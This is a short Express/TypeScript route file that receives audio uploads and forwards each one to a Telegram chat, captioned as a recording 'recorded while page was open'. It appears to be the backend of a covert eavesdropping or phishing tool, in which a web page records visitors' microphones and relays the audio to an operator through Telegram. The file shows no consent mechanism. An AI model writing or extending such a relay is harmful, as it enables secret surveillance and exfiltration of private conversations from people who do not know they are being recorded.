import { Router, type IRouter } from "express";
import multer from "multer";
import { sendAudioToChat, sendTextToChat } from "../lib/telegram";

const router: IRouter = Router();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

router.post("/audio", upload.single("audio"), async (req, res): Promise<void> => {
  const chatId = req.body?.chatId as string | undefined;

  if (!chatId) {
    res.status(400).json({ error: "chatId is required" });
    return;
  }

  if (!req.file || req.file.size < 100) {
    // No audio data or too small to be meaningful
    res.sendStatus(200);
    return;
  }

  try {
    const durationSec = Math.round(req.file.size / 16000); // rough estimate
    const caption = `🎤 Audio recording — ${durationSec}s (recorded while page was open)`;
    await sendAudioToChat(chatId, req.file.buffer, "recording.webm", caption);
    req.log.info({ chatId, size: req.file.size }, "Audio sent to Telegram");
    res.sendStatus(200);
  } catch (err) {
    req.log.error({ err, chatId }, "Failed to send audio to Telegram");
    res.status(500).json({ error: "Failed to send audio" });
  }
});

export default router;
